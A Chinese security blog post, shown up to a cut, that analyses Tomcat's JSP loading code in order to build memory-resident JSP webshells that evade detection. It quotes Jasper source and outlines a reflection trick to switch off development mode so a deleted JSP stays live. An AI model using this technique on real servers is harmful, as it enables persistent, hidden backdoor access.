<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>JSP内存马研究 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="JSP内存马研究"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 4.2.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
        <li><a href="/links">Links</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>JSP内存马研究</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/10/14/JSP内存马研究/" rel="bookmark">
        <time class="entry-date published" datetime="2021-10-14T02:03:17.000Z">
          2021-10-14
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近在研究webshell免杀的问题，到了内存马免杀部分发现传统的Filter或者Servlet查杀手段比较多，不太容易实现免杀，比如有些工具会将所有注册的<code>Servlet</code>和<code>Filter</code>拿出来，排查人员仔细一点还是会被查出来的，所以<strong>我们要找一些其他方式实现的内存马。比如我今天提到的JSP的内存马</strong>。</p>
<h2 id="JSP加载流程分析"><a href="#JSP加载流程分析" class="headerlink" title="JSP加载流程分析"></a>JSP加载流程分析</h2><p>​    在Tomcat中<code>jsp</code>和<code>jspx</code>都会交给<code>JspServlet</code>处理，所以要想实现<code>JSP</code>驻留内存，首先得分析<code>JspServlet</code>的处理逻辑。</p>
<a id="more"></a>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.jasper.servlet.JspServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jspx<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    下面分析<code>JspServlet#service</code>方法，主要的功能是接收请求的URL，判断是否预编译，核心的方法是<code>serviceJspFile</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span> <span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">      String jspUri = jspFile;</span><br><span class="line">          jspUri = (String) request.getAttribute(</span><br><span class="line">                  RequestDispatcher.INCLUDE_SERVLET_PATH);</span><br><span class="line">          <span class="keyword">if</span> (jspUri != <span class="keyword">null</span>) &#123;</span><br><span class="line"> 	  <span class="comment">//检查请求是否是通过其他Servlet转发过来的</span></span><br><span class="line">              String pathInfo = (String) request.getAttribute(</span><br><span class="line">                      RequestDispatcher.INCLUDE_PATH_INFO);</span><br><span class="line">              <span class="keyword">if</span> (pathInfo != <span class="keyword">null</span>) &#123;</span><br><span class="line">                  jspUri += pathInfo;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="comment">//获取ServletPath和pathInfo作为jspUri</span></span><br><span class="line">              jspUri = request.getServletPath();</span><br><span class="line">              String pathInfo = request.getPathInfo();</span><br><span class="line">              <span class="keyword">if</span> (pathInfo != <span class="keyword">null</span>) &#123;</span><br><span class="line">                  jspUri += pathInfo;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">//是否预编译</span></span><br><span class="line">          <span class="keyword">boolean</span> precompile = preCompile(request);</span><br><span class="line">          <span class="comment">//核心方法</span></span><br><span class="line">          serviceJspFile(request, response, jspUri, precompile);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (RuntimeException | IOException | ServletException e) &#123;</span><br><span class="line">          <span class="keyword">throw</span> e;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">          ExceptionUtils.handleThrowable(e);</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(e);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>preCompile</code>中只有当请求参数以<code>jsp_precompile</code>开始才会进行预编译，否则不进行预编译。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">preCompile</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    String queryString = request.getQueryString();</span><br><span class="line">    <span class="keyword">if</span> (queryString == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//    public static final String PRECOMPILE = System.getProperty("org.apache.jasper.Constants.PRECOMPILE", "jsp_precompile");</span></span><br><span class="line">    <span class="keyword">int</span> start = queryString.indexOf(Constants.PRECOMPILE);</span><br><span class="line">    <span class="keyword">if</span> (start &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    queryString =</span><br><span class="line">        queryString.substring(start + Constants.PRECOMPILE.length());</span><br><span class="line">    <span class="keyword">if</span> (queryString.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;             <span class="comment">// ?jsp_precompile</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (queryString.startsWith(<span class="string">"&amp;"</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;             <span class="comment">// ?jsp_precompile&amp;foo=bar...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!queryString.startsWith(<span class="string">"="</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;            <span class="comment">// part of some other name or value</span></span><br><span class="line">    &#125;</span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    那么预编译的作用是什么？当进行预编译后会怎么样？答案在<code>JspServletWrapper#service</code>中，当预编译后，请求便不会调用对应JSP的servlet的service方法进行处理，所以要想让我们的JSP能正常使用，当然是不要预编译的，默认情况下也不会预编译。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                       HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">boolean</span> precompile)</span></span></span><br><span class="line"><span class="function">           <span class="keyword">throws</span> ServletException, IOException, FileNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">       Servlet servlet;</span><br><span class="line"></span><br><span class="line">     ...</span><br><span class="line">       </span><br><span class="line">           <span class="comment">// If a page is to be precompiled only, return.</span></span><br><span class="line">           <span class="keyword">if</span> (precompile) &#123;</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">    ...</span><br><span class="line">           <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * (4) Service request</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">           <span class="keyword">if</span> (servlet <span class="keyword">instanceof</span> SingleThreadModel) &#123;</span><br><span class="line">              <span class="comment">// sync on the wrapper so that the freshness</span></span><br><span class="line">              <span class="comment">// of the page is determined right before servicing</span></span><br><span class="line">              <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">                  ``.service(request, response);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               servlet.service(request, response);</span><br><span class="line">           &#125;</span><br><span class="line">     ...</span><br></pre></td></tr></table></figure>

<p>​    下面再来看<code>serviceJspFile</code>方法，该方法判断JSP是否已经被注册为一个Servlet，不存在则创建JspServletWrapper并put到<code>JspRuntimeContext</code>中，<code>JspServletWrapper.service</code>是核心方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">serviceJspFile</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                                HttpServletResponse response, String jspUri,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">boolean</span> precompile)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//	首先判断JSP是否已经被注册为一个Servlet，ServletWrapper是Servlet的包装类，所有注册的JSP servlet都会被保存在JspRuntimeContext的jsps属性中，如果我们第一次请求这个JSP，当然是找不到wrapper的。</span></span><br><span class="line">        JspServletWrapper wrapper = rctxt.getWrapper(jspUri);</span><br><span class="line">        <span class="keyword">if</span> (wrapper == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">                wrapper = rctxt.getWrapper(jspUri);</span><br><span class="line">                <span class="keyword">if</span> (wrapper == <span class="keyword">null</span>) &#123;</span><br><span class="line">                 <span class="comment">//检查JSP文件是否存在</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">null</span> == context.getResource(jspUri)) &#123;</span><br><span class="line">                        handleMissingResource(request, response, jspUri);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//创建JspServletWrapper</span></span><br><span class="line">                    wrapper = <span class="keyword">new</span> JspServletWrapper(config, options, jspUri,</span><br><span class="line">                                                 rctxt);</span><br><span class="line">                    <span class="comment">//添加wrapper到JspRuntimeContext的jsps属性中</span></span><br><span class="line">                    rctxt.addWrapper(jspUri,wrapper);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//核心方法</span></span><br><span class="line">            wrapper.service(request, response, precompile);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException fnfe) &#123;</span><br><span class="line">            handleMissingResource(request, response, jspUri);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>JspServletWrapper.service</code>主要做了如下操作。</p>
<ul>
<li>根据jsp生成java文件并编译为class</li>
<li>将class文件注册为servlet</li>
<li>调用<code>servlet.service</code>方法完成调用</li>
</ul>
<p>JSP生成java和class文件主要由下面的代码完成，这里的<code>options.getDevelopment()</code>代表的是部署模式。</p>
<blockquote>
<p>tomcat的开发模式和生产模式的设定是通过conf文件夹下面的web.xml文件来配置的。</p>
<p>在开发模式下，容器会经常检查jsp文件的时间戳来决定是否进行编译，如果jsp文件的时间戳比对应的.class文件的时间戳晚就证明jsp又进行了修改，需要再次编译，但是不断地进行时间戳的比对开销很大，会影响系统性能，而在生产模式下系统不会经常想的检查时间戳。所以一般在开发过程中使用开发模式，这样可以在jsp修改后再次访问就可以见到修改后的效果非常方便，而系统上线之后就要改为生产模式，虽然生产模式下会导致jsp的修改需要重启服务器才可以生效，但是上线后的改动较少而且性能很重要。<br>原文链接：<a href="https://blog.csdn.net/qq_38293564/article/details/80371882" target="_blank" rel="noopener">https://blog.csdn.net/qq_38293564/article/details/80371882</a></p>
</blockquote>
<p>​    默认Tomcat是以开发模式运行的。一般我们遇到的Tomcat都是以开发模式运行的，所以会由<code>JspCompilationContext#compile</code>进行编译。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (options.getDevelopment() || mustCompile) &#123;</span><br><span class="line">           <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">               <span class="keyword">if</span> (options.getDevelopment() || mustCompile) &#123;</span><br><span class="line">                   ctxt.compile();</span><br><span class="line">                   mustCompile = <span class="keyword">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (compileException != <span class="keyword">null</span>) &#123;</span><br><span class="line">               <span class="comment">// Throw cached compilation exception</span></span><br><span class="line">               <span class="keyword">throw</span> compileException;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>​    下面我们看下编译部分都做了什么，Tomcat默认使用<code>JDTCompiler</code>编译，首先通过<code>isOutDated</code>判断是否需要编译，再去检查JSP文件是否存在，删除原有的java和Class文件，通过<code>jspCompiler.compile()</code>编译。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">compile</span><span class="params">()</span> <span class="keyword">throws</span> JasperException, FileNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">//获取编译器，默认使用JDTCompiler编译</span></span><br><span class="line">      createCompiler();</span><br><span class="line">    <span class="comment">//通过isOutDated决定是否编译</span></span><br><span class="line">      <span class="keyword">if</span> (jspCompiler.isOutDated()) &#123;</span><br><span class="line">          <span class="keyword">if</span> (isRemoved()) &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> FileNotFoundException(jspUri);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">              <span class="comment">//删除已经生成的java和Class文件</span></span><br><span class="line">              jspCompiler.removeGeneratedFiles();</span><br><span class="line">              jspLoader = <span class="keyword">null</span>;</span><br><span class="line">              <span class="comment">//编译</span></span><br><span class="line">              jspCompiler.compile();</span><br><span class="line">              jsw.setReload(<span class="keyword">true</span>);</span><br><span class="line">              jsw.setCompilationException(<span class="keyword">null</span>);</span><br><span class="line">          ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​    下面我们分析如何将生成的class文件注册为Servlet。首先判断<code>theServlet</code>是否为空，如果为空则表示还没有为JSP文件创建过Servlet，则通过<code>InstanceManager.newInstance</code>创建Servlet,并将创建的Servlet保存在<code>theServlet</code>属性中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> Servlet <span class="title">getServlet</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"><span class="comment">// getReloadInternal是否Reload默认为False，也就是说如果theServlet为true就会直接返回。</span></span><br><span class="line">        <span class="keyword">if</span> (getReloadInternal() || theServlet == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">if</span> (getReloadInternal() || theServlet == <span class="keyword">null</span>) &#123;</span><br><span class="line">             <span class="comment">//如果theServlet中有值则销毁该Servlet.</span></span><br><span class="line">                    destroy();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">final</span> Servlet servlet;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//创建Servlet实例</span></span><br><span class="line">                        InstanceManager instanceManager = InstanceManagerFactory.getInstanceManager(config);</span><br><span class="line">                        servlet = (Servlet) instanceManager.newInstance(ctxt.getFQCN(), ctxt.getJspLoader());</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        Throwable t = ExceptionUtils</span><br><span class="line">                                .unwrapInvocationTargetException(e);</span><br><span class="line">                        ExceptionUtils.handleThrowable(t);</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JasperException(t);</span><br><span class="line">                    &#125;</span><br><span class="line">				<span class="comment">//初始化servlet</span></span><br><span class="line">                    servlet.init(config);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (theServlet != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        ctxt.getRuntimeContext().incrementJspReloadCount();</span><br><span class="line">                    &#125;</span><br><span class="line">				<span class="comment">//将servlet保存到theServlet中，theServlet由volatile修饰，在线程之间可以共享。</span></span><br><span class="line">                    theServlet = servlet;</span><br><span class="line">                    reload = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> theServlet;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    下面有一个小知识点，<code>theServlet</code>是由<code>volatile</code>修饰的，在不同的线程之间可以共享，再通过<code>synchronized (this)</code>加锁，也就是说无论我们请求多少次，无论是哪个线程处理，只要<code>this</code>是一个值，那么<code>theServlet</code>属性的值是一样的，而<code>this</code>就是当前的<code>jspServletWrapper</code>，我们访问不同的JSP也是由不同的<code>jspServletWrapper</code>处理的。</p>
<p>​    最后就是调用<code>servlet.service</code>方法完成请求处理。</p>
<h2 id="内存驻留分析"><a href="#内存驻留分析" class="headerlink" title="内存驻留分析"></a>内存驻留分析</h2><p>​    上面我们已经分析完了JSP的处理逻辑，要想要完成内存驻留，我们要解决下面的问题。</p>
<ul>
<li>请求后不去检查JSP文件是否存在</li>
<li>theServlet中一直保存着我们的servlet，当我们请求对应url还能交给我们的servlet处理</li>
</ul>
<p>第二个问题比较容易，<code>theServlet</code>能否获取到Servlet或者获取到哪个Servlet和<code>jspServletWrapper</code>是有关的，而在<code>JspServlet#serviceJspFile</code>中，如果我们已经将Servlet注册过，可以根据url从<code>JspRuntimeContext</code>中获取得到对应的<code>jspServletWrapper</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">serviceJspFile</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                            HttpServletResponse response, String jspUri,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">boolean</span> precompile)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    JspServletWrapper wrapper = rctxt.getWrapper(jspUri);</span><br><span class="line">    <span class="keyword">if</span> (wrapper == <span class="keyword">null</span>) &#123;</span><br><span class="line">   ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        wrapper.service(request, response, precompile);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileNotFoundException fnfe) &#123;</span><br><span class="line">        handleMissingResource(request, response, jspUri);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="绕过方法一"><a href="#绕过方法一" class="headerlink" title="绕过方法一"></a>绕过方法一</h3><p>​    下面解决<code>请求后不去检查JSP文件是否存在</code>问题，首先我想绕过下面的判断,如果我们能让<code>options.getDevelopment()</code>返回false就不会进入<code>complie</code>部分。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (options.getDevelopment() || mustCompile) &#123;</span><br><span class="line">               <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (options.getDevelopment() || mustCompile) &#123;</span><br><span class="line">                       <span class="comment">// The following sets reload to true, if necessary</span></span><br><span class="line">                       ctxt.compile();</span><br><span class="line">                       mustCompile = <span class="keyword">false</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>development</code>并不是一个<code>static</code>属性，所以不能直接修改，要拿到<code>options</code>的对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> development = <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure>

<p>​        <code>options</code>对象被存储在<code>JspServlet</code>中，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JspServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> <span class="keyword">implements</span> <span class="title">PeriodicEventListener</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Options options;</span><br></pre></td></tr></table></figure>

<p>​    <code>MappingData</code>中保存了路由匹配的结果,<code>MappingData</code>的<code>wrapper</code>字段包含处理请求的<code>wrapper</code>，在Tomcat中，<code>Wrapper</code>代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet 的装载、初始化、执行以及资源回收。在<code>Wrapper</code>的<code>instance</code>属性中保存着<code>servlet</code>的实例，因此我们可以从<code>MappingData</code>中拿到<code>JspServlet</code>进而更改<code>options</code>的<code>development</code>属性值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MappingData</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Host host = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> Context context = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> contextSlashCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> Context[] contexts = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> Wrapper wrapper = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">boolean</span> jspWildCard = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/14/JSP%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211014170222482.png" alt="image-20211014170222482"></p>
<p>​    所以我们可以通过反射对<code>development</code>的属性修改，下面代码参考<a href="https://www.anquanke.com/post/id/224698" target="_blank" rel="noopener">Tomcat容器攻防笔记之JSP金蝉脱壳</a></p>
